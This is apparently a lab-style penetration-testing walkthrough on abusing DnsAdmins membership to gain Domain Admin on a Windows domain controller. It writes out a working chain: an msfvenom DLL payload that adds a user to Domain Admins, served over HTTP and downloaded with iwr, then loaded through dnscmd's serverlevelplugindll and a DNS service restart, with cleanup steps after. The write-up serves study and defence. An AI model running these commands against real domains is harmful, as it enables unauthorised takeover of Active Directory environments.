# Leveraging DnsAdmins Access to Domain Controller

Members of the DnsAdmins group can manage DNS servers, Which are very commonly running on domain controller. <br>
As detailed in [this blog post](https://adsecurity.org/?p=4064), there is a (fairly simple) way to get Domain Admin from DNSAdmins by loading an arbitrary dll on the dns server.

This is not considered a bug, it's RCE as a feature.

This is doable using the built-in execultable [dnscmd.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) :

```bat
dnscmd.exe /config /serverlevelplugindll \\path\to\dll
```

## Example walkthrough of the attack

First, to confirm your presence n the DNSAdmins group : 
```ps1
Get-ADGroupMember -Identity DnsAdmins
```

## Generating a Malicious DLL 
First we need a malicious DLL and to get it on our windows host. Here i'll use msfvenom to craft a dll that will add my user to the Domain Admins group, and i'll serve it using a simple python http server : 
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
python3 -m http.server 7777
```

## Launching the attack
Download my evil dll using Invoke-WebRequest: 
```ps1
iwr -Uri http:10.10.14.133:7777/adduser.dll -Outfile adduser.dll
```
Then, launch the attack : 
```ps1
# /!\ We need to specify the absolute path of the DLL 
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

This will change the ServerLevelPluginDll registry key to the absolute path of our dll.
The change will not be effective immediately, the DNS Server needs to restart first, but we can wait right ?

## Finalize the attack:
### Check our permissions 
We can restart the DNS __if we have the correct permissions__ to restart the DNS ourselves, else you'll have to wait. 
You need to know your SID first : 
```bat
wmic useraccount where name="netadm" get sid
SID
S-1-5-21-669053619-2741956077-1013132368-1109

# Then check the permissions of the DNS Service:
PS > sc.exe sdshow DNS 
```
#### Sidenote on reading SDDL
You'll get an alien-like string of SDDL syntax like this :
```
D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```
it's in two parts D: and S: describing respectively Discretionary and System ACLs. <br>
In the first half, you'll first your Access Control Entry String, here it looks like : <br>
`(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)`<br>

It is read like this : `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<br>
So here We have : 
```
ace_type:       A       (SDDL_ACCESS_ALLOWED)
ace_flags:
rights:         RPWP    (SDDL_READ_PROPERTY,SDDL_WRITE_PROPERTY)
object_guid:
inherit_object:
account_sid:    S-1-5-21-669053619-2741956077-1013132368-1109
```
[More Info on SDDL in this article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/#sc_sdshow)
or [here on MSDN](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)

### Restarting the DNS Server 
If we have the correct permissions, we can restart the service with sc.exe : 
```
sc stop dns
sc start dns
```
The DNS will show that it failed to restart properly as it attempts to run our DLL.
But our exploit should have run o/ <br>
So let's check it with `net group "Domain Admins" /dom` <br>
You should see 'netadm' in the members list :D

NOW, BE SMARTER THAN ME <br>
If you don't have permissions yet, logout and log back in again before searching for mistakes you never did.



## Cleaning up

Maybe avoid leaving everything there as blocking the DNS server is quite dirupting and can cause many issues over the entire active directory environment.
```ps
# Check our registry key
reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
# You should see :
#     ServerLevelPluginDll    REG_SZ    adduser.dll

# Delete it with : 
reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters -v ServerLevelPluginDll

# Then you should be able to successfully restart the DNS 
sc start dns

# You can check DNS status using 
sc query dns
```

## Notes
We can execute any type of DLL, an other good pick would've been [kdns from mimilib](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)